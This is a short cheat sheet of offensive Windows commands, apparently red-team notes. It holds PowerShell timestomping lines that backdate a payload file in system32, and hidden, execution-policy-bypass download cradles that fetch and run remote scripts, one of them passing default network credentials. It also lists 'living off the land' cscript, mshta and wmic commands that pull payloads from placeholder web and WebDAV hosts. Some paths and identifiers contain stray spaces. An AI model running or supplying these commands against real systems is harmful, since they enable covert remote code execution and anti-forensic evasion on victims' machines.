# PowerShell Tricks:

## PowerShell Change Timestamp of Directory:

```PS> (Get-Item "C:\Windows\system32\MyDir").CreationTime=("01 March 2019 19:00:00")```

## PowerShell Changing Modification Time of a File:

```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt").LastWriteTime=("01 March 2019 19:00:00")```

## PowerShell Changing Access Time of a File:

```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt ").LastAccessTime=("01 March 2019 19:00:00")```

## Sneaky PowerShell Commands:

```powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file] '))"```

```powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"```

# Living off the Land:

## Cscript/Wscript:

```cscript //E:jscript \\webdavserver\folder\payload.txt```

## MSHTA:

```mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload .sct"")"))```
```mshta \\webdavserver\folder\payload.hta```

## WMIC:

```wmic os get /format:"https://webserver/payload.xsl"```


